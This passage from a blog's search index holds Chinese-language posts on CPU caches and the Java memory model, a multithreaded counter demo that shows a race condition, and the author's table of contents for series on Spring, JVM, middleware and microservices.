    <content type="html"><![CDATA[<p>在多线程的情况下，从java内存模型和CPU乱序优化浅谈多线程不安全产生的原因</p><span id="more"></span><blockquote><p>序章中我们看到多线程中看到基数Demo计数出现误差，本章节从计算机原理和Java虚拟机相关探讨为什么会产生这些异常</p></blockquote><h2 id="CPU多级缓存"><a href="#CPU多级缓存" class="headerlink" title="CPU多级缓存"></a>CPU多级缓存</h2><p>cpu执行频率太快，快到主存跟不上，这样在处理器处理过程中，CPU常常需要等待主存，浪费资源。所以多级缓存（cache）的出现，就是<strong>为了解决CPU和内存之间速度不匹配的问题</strong>（cpu-&gt;cache-&gt;memory）</p><h3 id="CPU-缓存的意义"><a href="#CPU-缓存的意义" class="headerlink" title="CPU 缓存的意义"></a>CPU 缓存的意义</h3><ul><li><strong>时间局部性（Temporal Locality）</strong>：如果一个信息项正在被访问，那么在近期它很可能还会被再次访问。</li><li><strong>空间局部性（Spatial Locality）</strong>：如果一个存储器的位置被引用，那么将来他附近的位置也会被引用。</li></ul><h3 id="CPU缓存一致性协议-MESI"><a href="#CPU缓存一致性协议-MESI" class="headerlink" title="CPU缓存一致性协议(MESI)"></a>CPU缓存一致性协议(MESI)</h3><p>M 修改 (Modified)  E 独享、互斥 (Exclusive) S 共享 (Shared) I 无效 (Invalid)</p><p>该协议目的是<strong>为了保证CPU cache之间的共享数据的一致性</strong></p><p>更多详细信息请查阅资料</p><h3 id="CPU多级缓存-乱序执行优化"><a href="#CPU多级缓存-乱序执行优化" class="headerlink" title="CPU多级缓存-乱序执行优化"></a>CPU多级缓存-乱序执行优化</h3><p><strong>处理器为提高运算速度而做出违背代码原有顺序的优化</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//①</span><span class="token keyword">int</span> b<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">//②</span><span class="token keyword">int</span> c<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span><span class="token comment">//③</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>cpu乱序执行的时候 可能顺序变为②-&gt;①-&gt;③</p><p>在单线程单核的情况下不会出现问题，复杂的顺序的时候<strong>多线程下可能会存在问题</strong></p><h2 id="Java内存模型"><a href="#Java内存模型" class="headerlink" title="Java内存模型"></a>Java内存模型</h2><p>了解Java内存模型，了解Java内存模型如何对上述进行优化的</p><p>Java内存模型-JMM(Java Memory Model) Java内存模式是一种虚拟机规范，通过这组规范定义了程序中各个变量（包括实例字段，静态字段和构成数组对象的元素）的访问方式</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/java-memory-model-2-1620570065967.png" alt="java-memory-model-2"></p><p>cpu缓存模型结构图</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/6.jpg" alt="6"></p><p>Java内存模型抽象结构图</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/8.jpg" alt="8"></p><p>由此可见，Java 内存模型(JMM)同 CPU 缓存模型结构类似，是基于 CPU 缓存模型来建立的。</p><h3 id="主内存、工作内存的定义"><a href="#主内存、工作内存的定义" class="headerlink" title="主内存、工作内存的定义"></a>主内存、工作内存的定义</h3><ul><li><strong>主内存</strong></li></ul><blockquote><p>主内存主要存储的是 Java 实例对象，即所有线程创建的实例对象都存放在主内存中，不管该实例对象是成员变量还是方法中的本地变量(也称局部变量)，当然也包括了共享的类信息、常量、静态变量。由于是共享数据区域，多条线程对同一个变量进行访问可能会发现线程安全问题。</p></blockquote><ul><li><strong>工作内存（本地内存）</strong></li></ul><blockquote><p>工作内存主要存储当前方法的所有本地变量信息(工作内存中存储着主内存中的变量副本拷贝)，即每个线程只能访问自己的工作内存，即线程中的本地变量对其它线程是不可见的，就算是两个线程执行的是同一段代码，它们也会各自在自己的工作内存中创建属于当前线程的本地变量，当然也包括了字节码行号指示器、相关 Native 方法的信息。注意由于工作内存是每个线程的私有数据，线程间无法相互访问工作内存，因此存储在工作内存的数据不存在线程安全问题。</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token title important"><span class="token punctuation">##</span> 参考</span><span class="token url-reference url"><span class="token punctuation">[</span><span class="token variable">^1</span><span class="token punctuation">]</span><span class="token punctuation">:</span> http://ifeve.com/java-memory-model-6/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java进阶-并发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CPU多级缓存</tag>
      
      <tag>java内存模型</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java并发多线程与高并发(一)-序章</title>
    <link href="/posts/fc3007d7.html"/>
    <url>/posts/fc3007d7.html</url>
    
    <content type="html"><![CDATA[<p>并发线程体验，概述本系列讲的内容（线程并发安全&#x2F;高并发解决方案）</p><span id="more"></span><h1 id="初体验"><a href="#初体验" class="headerlink" title="初体验"></a>初体验</h1><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>concurrency<span class="token punctuation">.</span>experience</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutorService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executors</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Semaphore</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2021灼华. All rights reserved. * * @author create by hyq * @version 1.0 * @date 2021/4/21 * @description: */</span><span class="token annotation punctuation">@Slf4j</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CountExample</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> threadTotal <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> clientTotal <span class="token operator">=</span> <span class="token number">3000</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">long</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">Semaphore</span> semaphore <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Semaphore</span><span class="token punctuation">(</span>threadTotal<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> clientTotal<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    semaphore<span class="token punctuation">.</span><span class="token function">acquire</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    semaphore<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"exception"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"count:&#123;&#125;"</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>输出结果:</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">22</span><span class="token operator">:</span><span class="token number">14</span><span class="token operator">:</span><span class="token number">39.877</span> <span class="token punctuation">[</span>main<span class="token punctuation">]</span> <span class="token constant">INFO</span> <span class="token class-name"><span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>concurrency<span class="token punctuation">.</span>experience<span class="token punctuation">.</span></span>CountExample</span> <span class="token operator">-</span> count<span class="token operator">:</span><span class="token number">2958</span><span class="token class-name">Process</span> finished <span class="token keyword">with</span> <span class="token namespace">exit</span> code <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>多线程下上述案例没有达到<strong>3000</strong>这个预期的值</p><blockquote><p><strong>Semaphore</strong> 信号量，Java 并发库 的Semaphore可以控制某个资源可被同时访问的个数，通过 acquire() 获取一个许可，如果没有就等待，而 release() 释放一个许可</p></blockquote><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p><strong>进程</strong>：</p><div class="note note-success">            <p>进程是程序一次执行过程。比如程序从启动到销毁是一个进程</p>          </div><p><strong>线程</strong>：</p><div class="note note-success">            <p>线程是比进程更小的单位。一个进程在执行过程中可以产生多个线程</p>          </div><p><strong>并发与多线程的考虑点：</strong></p><div class="note note-success">            <p>考虑点在于多线程操作资源时候保证线程安全，保证程序不出现错误</p>          </div><p><strong>高并发考虑点：</strong></p><div class="note note-success">            <p>考虑点在于提高服务在处理多个请求时候，我们程序要尽可能的去提升程序性能，保证程序的抗压能力。可以从水平扩展，垂直扩展去实现</p>          </div><h1 id="线程的状态"><a href="#线程的状态" class="headerlink" title="线程的状态"></a>线程的状态</h1><ul><li><strong>新建状态</strong>（NEW）:新建状态，线程被构建，还未调用start()方法</li><li><strong>可运行状态</strong>（RUNNABLE）: 线程对象创建后，其他线程(比如 main 线程）调用了该对象 的 start ()方法。该状态的线程位于可运行线程池中，等待被线程调度选中，获 取 cpu 的使用权</li><li><strong>运行状态</strong>（RUNNING）:可运行状态( runnable )的线程获得了 cpu 时间片（ timeslice ） ，执行程序代码</li><li><strong>阻塞</strong>（BLOCK）:阻塞状态是指线程因为某种原因放弃了 cpu 使用权，也即让出了 cpu timeslice ，暂时停止运行。直到线程进入可运行( runnable )状态，才有 机会再次获得 cpu timeslice 转到运行( running )状态</li><li><strong>死亡</strong>（DEAD）:线程 run ()、 main () 方法执行结束，或者因异常退出了 run ()方法，则该线程结束生命周期。死亡的线程不可再次复生。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java进阶-并发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>进程</tag>
      
      <tag>线程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>整体规划与目录</title>
    <link href="/posts/d4ec423f.html"/>
    <url>/posts/d4ec423f.html</url>
    
    <content type="html"><![CDATA[<p>欢迎来到灼华的个人小站，本文会介绍接下来一段时间，个人的文章内容安排</p><span id="more"></span><h2 id="Java专栏"><a href="#Java专栏" class="headerlink" title="Java专栏"></a>Java专栏</h2><h3 id="Java并发多线程与高并发基础"><a href="#Java并发多线程与高并发基础" class="headerlink" title="Java并发多线程与高并发基础"></a>Java并发多线程与高并发基础</h3><blockquote><p>围绕java内存模型理解多级缓存，了解线程安全性的原因，进一步了解安全发布对象，线程安全策略，以及线程池框架Executer高并发下尝试手段介绍</p></blockquote><ul><li><input checked="" disabled="" type="checkbox"> Java并发多线程与高并发-序章</li><li><input checked="" disabled="" type="checkbox"> Java并发多线程与高并发(二)-并发基础</li><li><input checked="" disabled="" type="checkbox"> Java并发多线程与高并发(三)-线程安全性</li><li><input checked="" disabled="" type="checkbox"> Java并发多线程与高并发(四)-安全发布对象</li><li><input checked="" disabled="" type="checkbox"> Java并发多线程与高并发(五)-线程安全策略</li><li><input checked="" disabled="" type="checkbox"> Java并发多线程与高并发(六)-线程池</li></ul><h2 id="Java进阶"><a href="#Java进阶" class="headerlink" title="Java进阶"></a>Java进阶</h2><h3 id="spring源码"><a href="#spring源码" class="headerlink" title="spring源码"></a>spring源码</h3><ul><li><input checked="" disabled="" type="checkbox"> 剑指源码-spring(一)-序章</li><li><input checked="" disabled="" type="checkbox"> 剑指源码-spring(二)-BeanDefinitionRegistry将定义信息放入档案馆</li><li><input checked="" disabled="" type="checkbox"> 剑指源码-spring(三)-Bean初始化过程引出BeanPostProcessor</li><li><input checked="" disabled="" type="checkbox"> 剑指源码-spring(四)-后置处理器干预生命周期</li><li><input checked="" disabled="" type="checkbox"> 剑指源码-spring-(五)-Bean初始化流程</li><li><input checked="" disabled="" type="checkbox"> 剑指源码-spring-(六)-容器刷新的十二大步</li><li><input checked="" disabled="" type="checkbox"> 剑指源码-spring-(七)-AOP原理剖析</li></ul><h3 id="springmvc-源码"><a href="#springmvc-源码" class="headerlink" title="springmvc 源码"></a>springmvc 源码</h3><ul><li><input checked="" disabled="" type="checkbox"> 剑指源码-springmvc-(一)-序章</li><li><input checked="" disabled="" type="checkbox"> 剑指源码-springmvc-二-九大组件概述</li><li><input checked="" disabled="" type="checkbox"> 剑指源码-springmvc-三-HandlerMapping和HandlerAdapter细节</li></ul><h3 id="mybatis-源码"><a href="#mybatis-源码" class="headerlink" title="mybatis 源码"></a>mybatis 源码</h3><ul><li><p><input checked="" disabled="" type="checkbox"> 剑指源码-Mybatis-一-序章</p></li><li><p><input checked="" disabled="" type="checkbox"> 剑指源码-Mybatis-二-主流程分析与核心组件关系</p></li><li><p><input disabled="" type="checkbox"> ……</p></li></ul><h3 id="springboot-源码"><a href="#springboot-源码" class="headerlink" title="springboot 源码"></a>springboot 源码</h3><ul><li><p><input checked="" disabled="" type="checkbox"> 剑指源码-SpringBoot-一-序章</p></li><li><p><input disabled="" type="checkbox"> ……</p></li></ul><h3 id="jvm相关"><a href="#jvm相关" class="headerlink" title="jvm相关"></a>jvm相关</h3><ul><li><p><input checked="" disabled="" type="checkbox"> JVM与GC调优-一-字节码篇</p></li><li><p><input checked="" disabled="" type="checkbox"> JVM与GC调优-二-类加载篇</p></li><li><p><input checked="" disabled="" type="checkbox"> JVM与GC调优-三-内存结构篇</p></li><li><p><input disabled="" type="checkbox"> ……</p></li></ul><h3 id="juc相关"><a href="#juc相关" class="headerlink" title="juc相关"></a>juc相关</h3><ul><li><p><input checked="" disabled="" type="checkbox"> JUC-一-多线程筑基</p></li><li><p><input checked="" disabled="" type="checkbox"> JUC-二-CompletableFuture</p></li><li><p><input checked="" disabled="" type="checkbox"> JUC-三-Java的锁事</p></li><li><p><input checked="" disabled="" type="checkbox"> JUC-四-Java内存模型之JMM</p></li><li><p><input checked="" disabled="" type="checkbox"> JUC-五-CAS</p></li><li><p><input checked="" disabled="" type="checkbox"> JUC-六-原子操作类及十八罗汉增强</p></li><li><p><input checked="" disabled="" type="checkbox"> JUC-七-ThreadLocal详解</p></li></ul><h2 id="中间件专栏"><a href="#中间件专栏" class="headerlink" title="中间件专栏"></a>中间件专栏</h2><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><blockquote><p>Redis的简介与应用场景，Redis基本数据类型及常用操作，Redis主从复制，Redis集群部署,Redis与springboot整合，结合springboot的自动装配自定义封装Redis的stater,最后探讨缓存击穿以及缓存穿透的常用行业内解决方案</p></blockquote><h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><blockquote><p>消息队列的简介，RabbitMQ的AMQP协议介绍，rabbitmq与springboot的整合生产端与消费端，rabbitmq确认消息的实现以及延迟消息的实现</p></blockquote><h2 id="行业解决方案探讨"><a href="#行业解决方案探讨" class="headerlink" title="行业解决方案探讨"></a>行业解决方案探讨</h2><h3 id="分布式全局ID"><a href="#分布式全局ID" class="headerlink" title="分布式全局ID"></a>分布式全局ID</h3><blockquote><p>概述分布式中，非全局ID引发的问题，及全局分布式Id的实现（雪花算法）</p></blockquote><h3 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h3><blockquote><p>基于Mysql数据库for update实现，基于Redis的setnx+expire实现，基于Redission实现，基于zookeeper设置节点实现</p></blockquote><h3 id="分布式事务"><a href="#分布式事务" class="headerlink" title="分布式事务"></a>分布式事务</h3><blockquote><p>介绍为什么需要分布式事务，从mysql事务，spring事务，再到分布式事务中，CAP理论简介，最后介绍三种分布式事务的解决方案两阶段提交协议（2PC）、事务补偿（TCC）、消息队列实现最终一致</p></blockquote><h2 id="开源软件专栏"><a href="#开源软件专栏" class="headerlink" title="开源软件专栏"></a>开源软件专栏</h2><h2 id="微服务专栏"><a href="#微服务专栏" class="headerlink" title="微服务专栏"></a>微服务专栏</h2><p>微服务的主要技术栈</p><table><thead><tr><th>微服务组件</th><th>主流技术栈</th></tr></thead><tbody><tr><td>服务开发</td><td>Springboot、Spring、SpringMVC</td></tr><tr><td>服务注册与发现</td><td>Eureka、Consul、Zookeeper、Nacos等</td></tr><tr><td>配置中心</td><td>SpringCloudConfig、Nacos、Apollo等</td></tr><tr><td>服务调用</td><td>Rest(Feign)、RPC（Dubbo）</td></tr><tr><td>服务熔断器</td><td>Hystrix、Sentinel等</td></tr><tr><td>网关</td><td>Zuul、Geteway等</td></tr><tr><td>消息队列</td><td>Kafka、RabbitMQ、ActiveMQ等</td></tr><tr><td>负载均衡</td><td>Ribbon、Nginx等</td></tr><tr><td>…</td><td></td></tr></tbody></table><h2 id="从零搭建部署微服务架构专栏"><a href="#从零搭建部署微服务架构专栏" class="headerlink" title="从零搭建部署微服务架构专栏"></a>从零搭建部署微服务架构专栏</h2><h2 id="zephyr"><a href="#zephyr" class="headerlink" title="zephyr"></a>zephyr</h2><blockquote><p><strong>和风</strong> <em><strong>The zephyr is a symbol of hope in spring</strong></em></p></blockquote><table><thead><tr><th>组件中间件作用</th><th>组件名称</th><th>版本</th></tr></thead><tbody><tr><td>服务开发</td><td>springboot</td><td>2.x</td></tr><tr><td>注册中心</td><td>nacos</td><td>1.4.1</td></tr><tr><td>配置中心</td><td>nacos</td><td>1.4.1</td></tr><tr><td>网关</td><td>spring cloud config</td><td>x</td></tr><tr><td>服务间调用</td><td>feign</td><td>x</td></tr><tr><td>负载均衡</td><td>ribbon</td><td>x</td></tr><tr><td>熔断降级</td><td>sentinel</td><td>1.8.0</td></tr><tr><td>分布式事务</td><td>Seata</td><td>1.3.0</td></tr></tbody></table>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
